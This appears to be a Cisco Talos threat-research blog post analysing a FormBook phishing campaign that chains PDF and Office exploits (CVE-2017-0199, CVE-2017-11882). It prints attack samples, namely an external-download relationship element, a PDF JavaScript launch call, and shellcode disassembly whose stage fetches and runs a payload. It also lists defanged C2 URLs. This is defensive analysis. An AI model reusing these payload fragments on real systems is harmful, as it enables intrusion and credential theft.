My Little FormBook


This blog post is authored by Warren Mercer and Paul Rascagneres.


Summary

Cisco Talos has been tracking a new campaign involving the FormBook malware since May 2018 that utilizes four different malicious documents in a single phishing email. FormBook is an inexpensive stealer available as "malware as a service." This means an attacker can purchase a compiled piece of malware based on their desired parameters. This is commonplace with crimeware and stealer type malware such as FormBook. It is able to record keystrokes, steal passwords (stored locally and in web forms) and can take screenshots.


The author put a lot of effort in the infection vector using multiple malicious documents in a single phishing email. The author also mixed different file formats (PDF and Microsoft Office document) and used two public Microsoft Office exploits (CVE-2017-0199 and CVE-2017-11882) in order to drop the final payload on the targeted system. The final payload was downloaded during the campaign from a small Japanese file-sharing platform (hosted in Netherland). The platform owner has since deleted the malicious payload binaries from their system. Here is the infection workflow:



We identified an infrastructure overlap between this campaign and a previous campaign we published in February 2017 relating to Pony malware which utilized Microsoft Publisher files to deliver its payload. There is the potential that the same actor behind these two attacks is the same due to an overlap in the two attacks' infrastructure. If that is the case, the actor could switch between Pony and FormBook to be able to continue their malicious activities for more than a year.


Infection Vector


Phishing Campaign

This campaign starts with a malicious email containing two attachments. Here is a snippet of the email:



The email pretends to be an order sent from the sales department of a company located in Spain. The website's details and phone number appear to have been copied from that of a genuine company.

The email contains two attachments:



A blank malicious Microsoft Office document template file. (.dotm)

A malicious PDF document that is also blank. (.pdf)


First Office MalDoc (Attached)

The email contains two attachments as mentioned. One of these is a Microsoft Office document template file. This file type is normally used to share templates. The 'normal.dotm' file is the default Microsoft Word template that opens when Word is launched. The attacker, however, does not use the .dotm file format to share templates, but rather to download an additional Office document. 

If an example document from the campaign, named "STMORDER-442799.dotm," is opened, it appears blank. However, like most Office documents, if the file is unzipped and opened, you can access the attributes and XML information. This is where the attacker leverages CVE-2017-0199 to trigger an external download by abusing the relationship elements within "STMORDER-442799\word\_rels\document.xml.rels." Despite the file appearing to be blank, it does contain a large amount of XML information. We see the <Relationship> elements being abused:
<Relationship Id="_id_2970" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" TargetMode="External" Target="hxxps://pomf[.]pyonpyon[.]moe/cgcvsc.doc"/></Relationships>

This will cause the following document to be downloaded and executed from a Japanese file-hosting platform.



At the time of publishing, this file is no longer available and trying to view it results in a 404 error. The platform maintainer of PyonPyon.moe provides a list of malware that has been removed from the hosting platform — this can be found here. Within this data, we can identify our attempted download of the .doc file, among others related to this campaign, which were removed on the same day, June 8:


We were able to obtain multiple .doc files in relation to this campaign, which we will discuss later on. These .doc files are in rich text format (RTF), which leveraged CVE-2017-11882.


PDF document (Attached)

Also, attached to the initial email is a PDF file which contains a JavaScript object:
this.exportDataObject({ cName: "mine001.dotm", nLaunch: 2 });

This code launches a file embedded within the PDF document. In our case, the file is an Office document named "mine001.dotm."


Second Office MalDoc (Embedded)

The embedded Office document is exactly the same as the attached document discussed above. We don't know why the author of this campaign puts the same file in two seperate locations, or if it's on purpose or a mistake made during the phishing generation stage. It's possible the actor did not intend to attach both the DOTM and the PDF.


Third Office MalDoc (Downloaded)

The final malicious Office document is an RTF document. This RTF document contains an object linking and embedding (OLE) stream at the offset 0x9F (header d0 cf 11 e0 a1 b1 1a e1):

The red value is the stream length.

The blue value is equation editor MTEF header starting by 0x3.

The green value is the font record starting by 0x8. This vulnerability is an overflow on the front name located in grey in the snippet above. The overflow will redirect the flow in order to execute the RET code at the address 0x0041d1e8 (in pink).

Finally, a shellcode is executed.

Here is the first stage of the shellcode:
user@laptop:$ rasm2 -d B8C342BAFFF7D08B388B37BDC698B9FFF7D58B4D7756FFD10563D62D0B2D4DD52D0BFFE0
mov eax, 0xffba42c3
not eax
mov edi, dword [eax]
mov esi, dword [edi]
mov ebp, 0xffb998c6
not ebp
mov ecx, dword [ebp + 0x77]
push esi
call ecx
add eax, 0xb2dd663
sub eax, 0xb2dd54d
jmp eax

The purpose is to execute GlobalLock() (first call) and to finally jump in the second stage of the shellcode in bold orange in the hexadecimal code.

The purpose is to download and execute a binary located on a compromised WordPress website (hxxp://irishlebanese[.]com/wp-admin/images/eight/mine001.exe).



Final payload: FormBook

The final payload is located on a compromised WordPress website  (hxxp://irishlebanese[.]com/). The malware author stored many PE32 files on this server, some of which are still available. We have included more than 30 hashes of files stored on this server in the IOCs section. The most recent samples are FormBook samples. 

FormBook is an inexpensive stealer available as "malware as a service." It is able to record keystrokes, steal passwords (stored locally and in web forms) and can take screenshots. This post does not describe the malware in-depth, since there are excellent posts on the malware written by other researchers.


Overlaps with previous campaigns

In February 2017, we published an article about another stealer using Publisher and a public exploit to compromise systems. We found three interesting samples related to this case and our current FormBook case:



5aac259cb807a4c8e4986dbc1354ef566a12ced381b702a96474c0f8ff45f825 (located at hxxp://irishlebanese[.]com/wp-admin/admin/dor001.exe in May 2018)

82ce499994e4b2ee46e887946ef43f18b046639e81dfe1d23537ce6a530d8794 (located at hxxp://irishlebanese[.]com/wp-admin/admin/mine001.exe in May 2018)

8f6813634cb08d6df72e045294bf63732c0753f79293f1c9b2765f686f699a72 (located at  hxxp://irishlebanese[.]com/wp-admin/admin/mine001.exe in May 2018)



These three samples use the same FormBook infrastructure and the Pony infrastructure mentioned in our previous article:



hxxp://alphastand[.]top/alien/fre.php -> command and control (C2) server from 2017

hxxp://ukonlinejfk[.]ru/mine/fre.php 

hxxp://alphastand[.]trade/alien/fre.php  -> C2 server from 2017

hxxp://igtckeep[.]com/dor/fre.php 

hxxp://alphastand[.]win/alien/fre.php  -> C2 server from 2017

hxxp://kbfvzoboss[.]bid/alien/fre.php  -> C2 server from 2017

hxxp://www.cretezzy[.]com/do/ -> FormBook C2 server

hxxp://www.beemptty[.]com/se/ -> FormBook C2 server



The infrastructure sharing suggests that this is a common actor currently using two different stealers. Based on the timeline, we assume that the actor is currently moving from Pony to FormBook, another stealer.


Conclusion

This case shows us that malicious actors play with multiple file formats and embedded objects. In this campaign, the author used a PDF with an embedded Office document template using a vulnerability in order to download an additional Office RTF document, and then a second vulnerability and exploit in order to compromise the target. The attacker used an unfamiliar file-sharing platform in order to store the malicious document and a compromised WordPress site in order to store the final payload. We did notice that the file-sharing platform is reactive, removing the malicious files quickly, stopping the infection chain.

Some technical elements, such as infrastructure sharing, show us that the actor behind this campaign is probably the same actor behind a campaign we described one year ago. Last month it used two stealers in parallel on the same infrastructure. Based on the information we have today, he/she no longer uses Pony, but switched to FormBook in order to steal information on compromised systems.
